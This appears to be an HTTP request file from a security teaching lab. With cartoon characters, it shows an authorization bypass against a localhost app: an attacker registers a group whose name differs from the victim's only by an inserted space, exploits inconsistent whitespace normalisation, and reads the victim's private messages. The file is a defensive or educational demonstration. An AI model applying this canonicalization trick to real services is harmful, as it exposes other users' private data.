@base = http://localhost:8000/ii/normalization-canonicalization/example3

# Normally:
#   Spongebob can see Mr. Krabs messages as he is a member of the group.
#   Plankton is unable to access these messages directly (because he is not the member of this group)
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]

###

# Attack:
#   Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but with a whitespace present in the middle.
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": "staff @krusty-krab.sea",
    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
    "messages": []
}

###

# Now, when he accesses his newly created group, authorization checks "staff @krusty-krab.sea" (with space) where Plankton is admin,
# but message retrieval strips whitespace and fetches from "staff@krusty-krab.sea" (Mr. Krabs' group).
GET {{base}}/groups/staff @krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from_user": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
